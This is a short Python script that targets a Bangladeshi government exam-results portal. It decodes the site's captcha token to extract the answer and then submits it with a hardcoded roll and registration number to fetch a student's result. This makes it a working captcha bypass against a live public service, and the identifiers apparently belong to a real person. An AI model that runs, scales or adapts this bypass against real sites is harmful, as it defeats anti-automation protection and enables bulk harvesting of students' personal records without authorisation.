import requests
import base64

BASE = "https://result.bteb.gov.bd"
headers = {
    "User-Agent": "Mozilla/5.0",
    "Origin": "https://result.bteb.gov.bd",
    "Referer": "https://result.bteb.gov.bd/"
}

r_cap = requests.get(f"{BASE}/api/public/captcha", headers=headers, timeout=5)
token = r_cap.json().get("token")

# Decode token
padded = token + "=" * ((4 - len(token) % 4) % 4)
decoded_str = base64.b64decode(padded).decode('latin1')
print("Decoded token:", decoded_str)
parts = decoded_str.split('.')
extracted_captcha = parts[2]
print(f"EXTRACTED CAPTCHA FROM TOKEN: '{extracted_captcha}'")

# Test submitting with this extracted captcha!
payload = {
    "curriculumCode": "26",
    "rollNo": "208579",
    "regNo": "1502385808",
    "semester": "2",
    "examYear": "2025",
    "captchaToken": token,
    "captchaAnswer": extracted_captcha
}

res = requests.post(f"{BASE}/api/public/result", headers=headers, json=payload, timeout=8)
print("Result Status:", res.status_code)
print("Result Response:", res.json())
